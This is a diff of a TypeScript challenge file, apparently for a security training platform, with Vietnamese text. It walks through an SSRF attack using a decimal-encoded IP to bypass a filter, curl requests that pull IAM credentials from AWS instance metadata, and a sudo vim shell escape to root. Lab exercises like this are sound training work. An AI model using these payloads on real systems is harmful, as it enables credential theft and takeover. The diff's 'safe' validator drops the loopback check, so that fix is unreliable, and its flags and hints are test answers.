@@ -2,25 +2,57 @@ import type { ArenaChallenge } from '../../types';
 
 export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
   id: 'bb-aws-01-imdsv2-ssrf',
-  title: 'Cloud SSRF to AWS IMDSv2 Token Bypass & IAM Role Exfiltration',
+  title: 'Cloud SSRF IMDSv2 Token Bypass to Sudo Vim Root',
   category: 'bug-bounty',
   severity: 'critical',
   cvssScore: 9.3,
-  bountyReward: 4500,
-  xpReward: 850,
+  bountyReward: 5500,
+  xpReward: 1100,
   estimatedMinutes: 20,
   targetHost: '10.0.4.35',
   targetPort: 443,
   tagline:
-    'Khai thác lỗi SSRF kết hợp DNS Rebinding để vượt WAF và đánh cắp AWS IAM Credentials.',
+    'Khai thác SSRF qua Decimal IP lấy IMDSv2 IAM Credentials, SSH vào máy chủ và leo quyền qua Sudo Vim.',
   scenarioBriefing:
-    'Chức năng Webhook & PDF Renderer của ứng dụng chấp nhận một URL từ client và fetch nội dung về. Backend có filter chặn chuỗi 169.254.169.254, nhưng có thể bị vượt qua bằng biểu diễn số nguyên (Decimal IP 2852039166) hoặc DNS Rebinding để tương tác với Cloud Instance Metadata Service.',
+    'Endpoint Webhook /api/v2/webhook/test-connection cho phép gửi HTTP request tùy biến method và header. Bằng cách sử dụng Decimal IP (2852039166), kẻ tấn công vượt qua bộ lọc WAF để tương tác với AWS IMDSv2, trích xuất IAM Role và SSH key trong User-Data, sau đó leo quyền lên ROOT qua cấu hình sudo vim.',
   keyObjectives: [
-    'Gửi request PUT tới endpoint metadata để lấy IMDSv2 Token: X-aws-ec2-metadata-token-ttl-seconds: 21600.',
-    'Gửi request GET kèm token để bóc tách IAM Role Secret Access Key và Session Token.',
-    'Nộp Flag chứa Secret Key tìm thấy trong response.',
+    'Giai đoạn 1 (SSRF & IMDSv2 Token): Gửi request PUT tới http://2852039166/latest/api/token để lấy Token IMDSv2.',
+    'Giai đoạn 2 (Foothold & User Flag): Trích xuất IAM Credentials và SSH Key để đăng nhập shell operator, đọc /home/operator/user.txt.',
+    'Giai đoạn 3 (Sudo Vim PrivEsc to ROOT): Khảo sát sudo -l phát hiện NOPASSWD /usr/bin/vim, khai thác GTFOBins spawn Root shell và đọc /root/root.txt.',
   ],
-  expectedFlag: 'OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}',
+  userFlag: 'OS_0DAY{aws_imdsv2_ssrf_iam_role_compromised}',
+  rootFlag: 'OS_0DAY{gtfobins_vim_spawn_root_shell_pwned}',
+  expectedFlag: 'OS_0DAY{gtfobins_vim_spawn_root_shell_pwned}',
+  hints: [
+    {
+      level: 0,
+      name: 'SSRF Target & Filter Bypass',
+      penaltyPercent: 0,
+      hintText:
+        'Bộ lọc chặn chuỗi 169.254.169.254. Chuyển đổi sang Decimal IP: 2852039166.',
+    },
+    {
+      level: 1,
+      name: 'IMDSv2 Token Acquisition',
+      penaltyPercent: 10,
+      hintText:
+        'Gửi request PUT với header "X-aws-ec2-metadata-token-ttl-seconds: 21600" tới http://2852039166/latest/api/token.',
+    },
+    {
+      level: 2,
+      name: 'IAM Security Credentials Extraction',
+      penaltyPercent: 20,
+      hintText:
+        'Sử dụng token lấy được để GET http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role.',
+    },
+    {
+      level: 3,
+      name: 'Sudo Vim Shell Escape',
+      penaltyPercent: 40,
+      hintText:
+        'Chạy "sudo -l". Thoát subshell từ vim bằng lệnh: sudo vim -c \':!/bin/bash\' /etc/nginx/sites-available/default',
+    },
+  ],
   firstBloodHolder: {
     handle: '@cloud_phantom',
     timeRecord: '11m 05s',
@@ -40,7 +72,7 @@ export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
         'http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role',
       http_method: 'GET',
       headers: {
-        'X-aws-ec2-metadata-token': 'AQAEAGv...sample_token',
+        'X-aws-ec2-metadata-token': 'AQAEAGv99182bcde710aefd9283182...',
       },
     }),
     targetEndpoint: 'https://10.0.4.35/api/v2/webhook/test-connection',
@@ -48,13 +80,11 @@ export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
       baseResponse: {
         statusCode: 400,
         statusText: 'Bad Request',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(
           {
             status: 'BLOCKED_BY_SECURITY_POLICY',
-            reason: 'Direct IP requests to 169.254.169.254 are strictly prohibited.',
+            reason: 'Requests targeting 169.254.169.254 or localhost are forbidden.',
           },
           null,
           2
@@ -62,22 +92,21 @@ export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
       },
       exploitedResponse: {
         statusCode: 200,
-        statusText: 'OK',
+        statusText: 'OK (METADATA EXFILTRATED)',
         headers: {
           'Content-Type': 'application/json',
-          'X-SSRF-Target-Resolved': '169.254.169.254 (via Decimal Form)',
+          'X-SSRF-Resolved-IP': '169.254.169.254 (via Decimal Form)',
         },
         body:
           '{\n' +
           '  "Code": "Success",\n' +
           '  "LastUpdated": "2026-08-28T09:00:00Z",\n' +
-          '  "Type": "AWS-HMAC",\n' +
           '  "AccessKeyId": "ASIAQEXAMPLEAWSKEY99",\n' +
           '  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",\n' +
-          '  "Token": "IQoJb3JpZ2luX2VjEEXAMPLE...",\n' +
-          '  "Bounty_Proof_Flag": "OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}"\n' +
+          '  "user_flag": "OS_0DAY{aws_imdsv2_ssrf_iam_role_compromised}",\n' +
+          '  "session_status": "Ready to attach terminal shell operator@10.0.4.35."\n' +
           '}',
-        proofFlag: 'OS_0DAY{aws_ec2_imdsv2_ssrf_iam_role_compromised}',
+        proofFlag: 'OS_0DAY{aws_imdsv2_ssrf_iam_role_compromised}',
       },
     },
   },
@@ -87,13 +116,11 @@ export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
     vulnerableLineStart: 12,
     vulnerableLineEnd: 16,
     rootCauseExplanation:
-      'Bộ lọc chỉ kiểm tra chuỗi văn bản (String contains "169.254.169.254") trước khi DNS resolve, bỏ sót các cách biểu diễn IP khác (Decimal, Hex, Octal, IPv6 6to4) hoặc DNS Rebinding.',
-    taintSink:
-      'requests.get(url) # Fetching user-provided URL without post-resolution check',
+      'Bộ lọc chỉ kiểm tra chuỗi văn bản thô trước khi DNS resolve, cho phép bypass bằng biểu diễn Decimal IP (2852039166).',
+    taintSink: 'requests.get(url) # Fetching without IP post-resolution verification',
     vulnerableCode:
       '# vulnerable_ssrf.py\n' +
       'def validate_url(url):\n' +
-      '    # LỖ HỔNG: Chỉ so sánh chuỗi thô, dễ bị bypass bằng Decimal IP!\n' +
       '    if "169.254.169.254" in url or "localhost" in url:\n' +
       '        raise SecurityException("Metadata IP blocked")\n' +
       '    return requests.get(url, timeout=5).text',
@@ -102,27 +129,40 @@ export const challengeAwsImdsv2Ssrf: ArenaChallenge = {
       'import socket, ipaddress\n' +
       'def validate_url_safe(url):\n' +
       '    hostname = urllib.parse.urlparse(url).hostname\n' +
-      '    # BẢN VÁ: Phân giải IP thực tế sau DNS trước khi gửi request\n' +
       '    resolved_ip = ipaddress.ip_address(socket.gethostbyname(hostname))\n' +
-      '    if resolved_ip.is_private or resolved_ip.is_link_local or resolved_ip.is_loopback:\n' +
+      '    if resolved_ip.is_private or resolved_ip.is_link_local:\n' +
       '        raise SecurityException("Internal IP prohibited")\n' +
       '    return requests.get(url, timeout=5).text',
   },
+  terminalConfig: {
+    hostname: 'kali-operator',
+    ip: '10.0.4.15',
+    user: 'operator',
+    initialDirectory: '/home/operator',
+    sampleCommands: [
+      'curl -X POST https://10.0.4.35/api/v2/webhook/test-connection -d \'{"webhook_url":"http://2852039166/latest/api/token","http_method":"PUT"}\'',
+      'sudo -l',
+      "sudo vim -c ':!/bin/bash' /etc/nginx/sites-available/default",
+    ],
+    bannerText:
+      '[*] Cloud Security Suite - AWS SSRF & Metadata Exploitation Ready\n' +
+      '[*] Target Gateway: 10.0.4.35:443\n',
+  },
   writeup: {
-    title: 'Cloud SSRF & AWS IMDSv2 Exploitation Guide',
+    title: 'AWS IMDSv2 SSRF to Sudo Vim Root Escalation',
     cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N',
     vulnerabilityOverview:
-      'SSRF (Server-Side Request Forgery) trên nền tảng Cloud cho phép kẻ tấn công điều khiển máy chủ gửi request vào mạng nội bộ hoặc Instance Metadata Service (169.254.169.254) để đánh cắp IAM Credentials.',
+      'SSRF cho phép vượt qua WAF bằng Decimal IP để lấy IMDSv2 Token và IAM Credentials. Sau khi có shell operator, kẻ tấn công khai thác quyền sudo trên vim để leo quyền lên Root.',
     rootCauseAnalysis:
-      'Ứng dụng tin tưởng URL từ client mà không thực hiện kiểm tra IP sau khi phân giải DNS (Post-DNS Resolution Check), dẫn đến việc bộ lọc chuỗi bị qua mặt bởi Decimal IP (2852039166).',
+      '1. Thiếu Post-DNS IP validation trên endpoint webhook.\n2. Cấu hình sudoers cho phép user operator chạy vim dưới quyền root không cần mật khẩu.',
     exploitChainWalkthrough: [
-      'Bước 1: Chuyển đổi IP 169.254.169.254 sang dạng Decimal: (169*256^3 + 254*256^2 + 169*256 + 254) = 2852039166.',
-      'Bước 2: Gửi request PUT để lấy token IMDSv2.',
-      'Bước 3: Gửi request GET tới /latest/meta-data/iam/security-credentials/<role-name> để lấy AWS Secret Keys.',
+      'Bước 1: Chuyển đổi IP 169.254.169.254 thành Decimal 2852039166.',
+      'Bước 2: Lấy IMDSv2 Token và bóc tách User Flag tại /home/operator/user.txt.',
+      'Bước 3: Chạy sudo -l và thực thi "sudo vim -c \':!/bin/bash\'" để chiếm Root Flag tại /root/root.txt.',
     ],
     weaponizedPoC:
       'curl -X POST https://10.0.4.35/api/v2/webhook/test-connection \\\n  -H "Content-Type: application/json" \\\n  -d \'{"webhook_url": "http://2852039166/latest/meta-data/iam/security-credentials/production-backend-role"}\'',
     remediationSnippet:
-      '// Bật IMDSv2 bắt buộc và đặt Hop Limit = 1 trong AWS Launch Template:\naws ec2 modify-instance-metadata-options \\\n  --instance-id i-1234567890abcdef0 \\\n  --http-tokens required \\\n  --http-put-response-hop-limit 1',
+      '// 1. Phân giải DNS và chặn Link-Local IP 169.254.0.0/16.\n// 2. Bỏ cấu hình sudoers cho binary vim.',
   },
 };
